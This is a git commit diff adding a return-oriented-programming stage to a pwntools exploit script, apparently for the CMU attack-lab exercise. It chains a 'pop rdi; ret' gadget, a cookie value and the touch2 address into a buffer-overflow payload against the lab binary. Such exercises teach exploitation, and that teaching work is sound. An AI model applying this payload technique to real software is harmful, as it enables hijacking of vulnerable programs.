fad9c6c0d5cde8311266bf4fe61a14c4b2a4994e
justapig9020 <justapig9020@gmail.com>
2022-04-13 13:44:17 +0800

    Solved touch2 by ROP

--- attack/attack/exp.py
+++ attack/attack/exp.py
@@ -3,6 +3,7 @@ from pwn import *
 def set_p64(addr):
     return p64(addr).decode("iso-8859-1")
 
+pop_rdi_ret = 0x40141b
 cookie = 0x59b997fa
 touch1 = 0x4017c0
 touch2 = 0x4017ec
@@ -20,3 +21,16 @@ payload = junk + set_p64(touch1)
 p.sendline(payload)
 print(str(p.recv(), "ascii"))
 
+# touch 2
+
+p = process(ctarget)
+
+
+input("#")
+
+payload = junk + set_p64(pop_rdi_ret) + set_p64(cookie) + set_p64(touch2)
+
+p.sendline(payload)
+print(str(p.recv(), "ascii"))
+
+# p = process(ctarget)
